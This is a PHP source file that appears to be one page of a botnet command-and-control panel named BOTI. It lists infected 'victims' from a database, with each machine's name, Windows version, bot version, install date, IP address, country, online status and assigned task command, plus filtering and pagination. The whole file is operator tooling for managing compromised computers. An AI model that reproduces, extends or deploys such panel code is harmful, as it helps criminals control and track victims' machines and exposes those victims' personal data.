<?php

class BOTI_func_list {
	var $content;
	function run() {
		global $_BOTI;
		$propage = 50;
		if(!isset($_GET['all'])) {
			$count = mysql_num_rows($_BOTI->query("SELECT ID FROM BOTI_victims".(isset($_GET['online']) ? ' WHERE ConTime >'.(time()-$_BOTI->online) : '')));
			if(isset($_GET['page']) && (intval($_GET['page'])-1)*$propage < $count && intval($_GET['page']) >= 1) {
				$page = intval($_GET['page']);
				$limit = ($page-1)*$propage.','.$propage;
			} else {
				$page = 1;
				$limit = '0,'.$propage;
			}
		}
		$this->content .= title("Bots");
		$table = '<div style="text-align:right;padding-right:10px">';
		
		if(!isset($_GET['online'])) $table .= '<a href="?action=list&online'.(isset($_GET['all']) ? '&all' : '').'" class="button"><span>Only online Bots</span></a>';
		else $table .= '<a href="?action=list'.(isset($_GET['all']) ? '&all' : '').'" class="button"><span>All Bots</span></a>';
		if(!isset($_GET['all'])) $table .= '<a href="?action=list'.(isset($_GET['online']) ? '&online' : '').'&all" class="button"><span>No Pages</span></a>';
		else $table .= '<a href="?action=list'.(isset($_GET['online']) ? '&online' : '').'" class="button"><span>Show Pages</span></a>';

		$table .= '</div><br /><table><tr class="tr_title">
		<td style="width:20px">&nbsp;</td>
		<td style="width:20px">&nbsp;</td>
		<td>Name</td>
		<td>Operating System</td>
		<td>Version</td>
		<td>Install Date</td>
		<td>IP</td>
		<td>Status</td>
	</tr>';

		$query = $_BOTI->query("SELECT v.*,t.command FROM BOTI_victims AS v LEFT JOIN BOTI_tasks AS t ON (t.taskID=v.taskID)".(isset($_GET['online']) ? ' WHERE ConTime >'.(time()-$_BOTI->online) : '').(!isset($_GET['all']) ? ' LIMIT '.$limit : ''));
		while($ds=mysql_fetch_array($query)) {
			$status = ($ds['ConTime'] > time()-$_BOTI->online ? ($ds['taskID'] ? '<a href="?action=tasks&id='.$ds['taskID'].'" class="green">'.$ds['command'].'</a>' : '<span class="green">Online</span>') : '<span class="red">Offline</span>');
			$table .= '<tr><td>#'.$ds['ID'].'</td><td><img src="images/lang/'.strtolower($ds['Country']).'.gif" alt="DE"/></td><td>'.$ds['PCName'].'</td><td>'.$ds['WinVersion'].'</td><td>'.$ds['BotVersion'].'</td><td>'.date("d.m.Y", $ds['InstTime']).'</td><td>'.$ds['IP'].'</td><td>'.($status).'</td></tr>';
		}
		$table .= '</table>';
		if($count > $propage && !isset($_GET['all'])) {
			$table .= '<div style="text-align:right;padding-right:10px;padding-top:10px;">';
			if($page != 1) $table .= '<a href="?action=list'.(isset($_GET['online']) ? '&online' : '').'&page='.($page-1).'" class="button"><span>&laquo; Zurück</span></a>';
			if($page != ceil($count/$propage)) $table .= '<a href="?action=list'.(isset($_GET['online']) ? '&online' : '').'&page='.($page+1).'" class="button"><span>Weiter &raquo;</span></a>';
			$table .= '</div>';
		}
		$this->content .= content($table);
	}

}


?>